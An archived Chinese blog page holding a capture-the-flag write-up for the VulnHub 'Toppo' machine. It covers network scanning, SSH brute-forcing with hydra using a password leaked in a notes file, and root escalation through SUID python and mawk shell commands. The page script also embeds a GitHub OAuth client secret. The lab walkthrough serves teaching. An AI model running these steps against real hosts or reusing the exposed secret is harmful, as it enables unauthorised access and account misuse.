@@ -1,0 +1,387 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    
+    <title>Write-up-Toppo | Kali-Team</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
+    <meta name="description" content="Kali-Team">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+
+</head>
+</html>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Kali-Team</span>
+                    <span class="description">三米前有蕉皮</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2018/10/30/Write-up-Toppo/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2018/10/30/Write-up-Toppo/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2018/10/30/Write-up-Toppo/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2018/10/30/Write-up-Toppo/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
+                        |
+                    
+                </p>
+                <p class="sns">
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>Write-up-Toppo</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Kali-Team 发表于
+        <time datetime="2018-10-30T11:44:14.000Z">2018-10-30</time>
+    </p>
+    <div class="post-content">
+        <h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul>
+<li><p>下载地址：<a href="https://download.vulnhub.com/toppo/Toppo.zip" target="_blank" rel="noopener">点我</a></p>
+</li>
+<li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av35092800/" target="_blank" rel="noopener">哔哩哔哩</a></p>
+</li>
+</ul>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li>vmnet8网卡，IP：192.168.131.144，开放web，ssh服务</li>
+</ul>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8 </span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 19:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.1</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.00093s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br><span class="line">➜  ~ nmap -T4 -A 192.168.131.144</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 20:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.131.144</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)</span><br><span class="line">|   2048 89:99:c4:54:9a:18:66:f7:<span class="built_in">cd</span>:8e:ab:b6:aa:31:2e:c6 (RSA)</span><br><span class="line">|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)</span><br><span class="line">|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Clean Blog - Start Bootstrap Theme</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          41760/udp  status</span><br><span class="line">|_  100024  1          44661/tcp  status</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.36 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>nikto发现了admin目录还有一个mail目录。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://192.168.131.144/</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.131.144</span><br><span class="line">+ Target Hostname:    192.168.131.144</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2018-10-30 20:04:51 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.10 (Debian)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">'-C all'</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ OSVDB-3268: /admin/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /admin/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /img/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /img/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /mail/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /mail/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /manual/images/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2018-10-30 20:05:10 (GMT8) (19 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+<ul>
+<li>admin目录里有一个notes.txt文件，这是他以前的密码:/ 12345ted123。而且提到了技术，钓鱼和足球。社工有用。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.131.144/admin/notes.txt</span><br><span class="line">Note to myself :</span><br><span class="line"></span><br><span class="line">I need to change my password :/ 12345ted123 is too outdated but the technology isn<span class="string">'t my thing i prefer go fishing or watching soccer .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure>
+<h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><ul>
+<li>生成字典爆破ssh，用户名ted，别问我怎么知道的全网都是猜出来的，只能说出题人没给太多的提示，直觉。</li>
+<li>hydra爆破得到密码为12345ted123</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  pydictor git:(master) ✗ python pydictor.py -plug scratch http://192.168.131.144/admin/notes.txt</span><br><span class="line">                              _ _      _</span><br><span class="line">              _ __  _   _  __| (_) ___| |_ ___  _ __</span><br><span class="line">             | <span class="string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__|</span><br><span class="line">             | |_) | |_| | (_| | | (__| || (_) | |</span><br><span class="line">             | .__/ \__, |\__,_|_|\___|\__\___/|_|</span><br><span class="line">             |_|    |___/                            2.1.1<span class="comment">#dev</span></span><br><span class="line"></span><br><span class="line">[+] A total of :11 lines</span><br><span class="line">[+] Store <span class="keyword">in</span>   :/home/kali-team/Kali-Team/password-recovery/pydictor/results/scratch_214601.txt </span><br><span class="line">[+] Cost       :0.0451 seconds</span><br><span class="line">➜  pydictor git:(master) ✗ cat results/scratch_214601.txt </span><br><span class="line">myself</span><br><span class="line">password</span><br><span class="line">12345ted123</span><br><span class="line">outdated</span><br><span class="line">technology</span><br><span class="line">thing</span><br><span class="line">prefer</span><br><span class="line">fishing</span><br><span class="line">watching</span><br><span class="line">soccer</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line">➜  ~ hydra -l ted -P Kali-Team/password-recovery/pydictor/results/scratch_215638.txt ssh://192.168.131.144</span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-30 21:57:18</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.131.144:22/</span><br><span class="line">[22][ssh] host: 192.168.131.144   login: ted   password: 12345ted123</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-30 21:57:21</span><br></pre></td></tr></table></figure>
+<h3 id="提权GetFlag"><a href="#提权GetFlag" class="headerlink" title="提权GetFlag"></a>提权GetFlag</h3><ul>
+<li>找开启了SUID权限的应用</li>
+</ul>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ted@<span class="symbol">Toppo:</span>~$ id</span><br><span class="line">uid=<span class="number">1000</span>(ted) gid=<span class="number">1000</span>(ted) groups=<span class="number">1000</span>(ted),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">108</span>(netdev),<span class="number">114</span>(bluetooth)</span><br><span class="line">ted@<span class="symbol">Toppo:</span>~$ find / -perm -u=s -<span class="keyword">type</span> f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">eject</span>/<span class="title">dmcrypt</span>-<span class="title">get</span>-<span class="title">device</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">dbus</span>-1.0/<span class="title">dbus</span>-<span class="title">daemon</span>-<span class="title">launch</span>-<span class="title">helper</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">openssh</span>/<span class="title">ssh</span>-<span class="title">keysign</span></span></span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/python2.<span class="number">7</span></span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mawk</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
+<ul>
+<li>找不用root密码就可以用sudo的应用，发现mawk，和Python2.7都不用。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ cat /etc/sudoers </span><br><span class="line">ted ALL=(ALL) NOPASSWD: /usr/bin/awk</span><br><span class="line"></span><br><span class="line">ted@Toppo:~$</span><br></pre></td></tr></table></figure>
+<ul>
+<li><ol>
+<li>py,</li>
+<li>mawk</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:/bin$ python -c <span class="string">'import pty;pty.spawn("/bin/sh")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line">ted@Toppo:/bin$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">ted@Toppo:/bin$ mawk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /root/flag.txt</span></span><br><span class="line">_________                                  </span><br><span class="line">|  _   _  |                                 </span><br><span class="line">|_/ | | \_|.--.   _ .--.   _ .--.    .--.   </span><br><span class="line">    | |  / .<span class="string">'`\ \[ '</span>/<span class="string">'`\ \[ '</span>/<span class="string">'`\ \/ .'</span>`\ \ </span><br><span class="line">   _| |_ | \__. | | \__/ | | \__/ || \__. | </span><br><span class="line">  |_____| <span class="string">'.__.'</span>  | ;.__/  | ;.__/  <span class="string">'.__.'</span>  </span><br><span class="line">                 [__|     [__|              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations ! there is your flag : 0wnedlab&#123;p4ssi0n_c0me_with_pract1ce&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><ul>
+<li>在测试过程中我发现，Python有root权限，执行bash和执行dash返回的权限不一样，bash返回的是普通权限，而dash返回的是root权限。发了三次朋友圈求助终于明白了。其实bash加参数-p使用Posix模式也可以获取root权限。这里接触到了一个新的知识是POSIX 1003.2规范的标准，有兴趣的可以去搜索一下。我就不在这扯了。估计能写几页。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash -p")'</span></span><br><span class="line">bash-4.3<span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/bash")'</span></span><br><span class="line">bash-4.3$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line">bash-4.3$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ted@Toppo:~$ python -c <span class="string">'import os;os.system("/bin/dash")'</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4088 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      2011  0.0  1.1   9816  6120 pts/0    S+   11:13   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">ted       2012  0.0  0.6   5448  3528 pts/1    Ss   11:13   0:00                  \_ /bin/bash</span><br><span class="line">ted       2013  0.0  0.4   4768  2548 pts/1    R+   11:13   0:00                      \_ ps aux f</span><br><span class="line">root      1926  0.0  1.0  10988  5420 ?        Ss   11:05   0:00  \_ sshd: ted [priv]    </span><br><span class="line">ted       1928  0.0  0.7  10988  4084 ?        S    11:05   0:00      \_ sshd: ted@pts/0     </span><br><span class="line">ted       1929  0.0  0.8   6376  4288 pts/0    Ss   11:05   0:00          \_ -bash</span><br><span class="line">root      1998  0.0  1.1   9816  6012 pts/0    S+   11:11   0:00              \_ python -c import pty;pty.spawn(<span class="string">"/bin/dash"</span>)</span><br><span class="line">root      1999  0.0  0.2   2272  1380 pts/1    Ss   11:11   0:00                  \_ /bin/dash</span><br><span class="line">root      2001  0.0  0.4   4768  2416 pts/1    R+   11:12   0:00                      \_ ps aux f</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/CTF/">CTF</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/CTF/" title="CTF">CTF</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br>
+        <a href="/2019/02/14/Genymotion设置代理至BurpSuite和Charles/">
+            
+                Genymotion设置代理至BurpSuite和Charles
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br>
+        <a href="/2018/10/26/Write-up-CH4INRULZ-v1-0-1/">
+            
+                Write-up-CH4INRULZ_v1.0.1
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/favicon.ico" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: 'Write-up-Toppo' || '2018/10/30/Write-up-Toppo/',
+    owner: 'cn-kali-team',
+    repo: 'cn-kali-team.github.io',
+    clientId: '0683bca9d762208912a9',
+    clientSecret: 'fd3e06918ff647fd4b347dfeba033b588a957fc5'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/Arch/">Arch</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/工具/">工具</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/漏洞复现/">漏洞复现</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CTF/">CTF</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Web/">Web</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
+  
+    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
+  
+    <a class="tag-item" href="/tags/漏洞复现/" title="漏洞复现">漏洞复现 (1)</a>
+  
+    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
+  
+    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
+  
+    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
+  
+    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
+  
+    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
+  
+    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
+        </li>
+    
+        <li>
+            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
+        </li>
+    
+        <li>
+            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
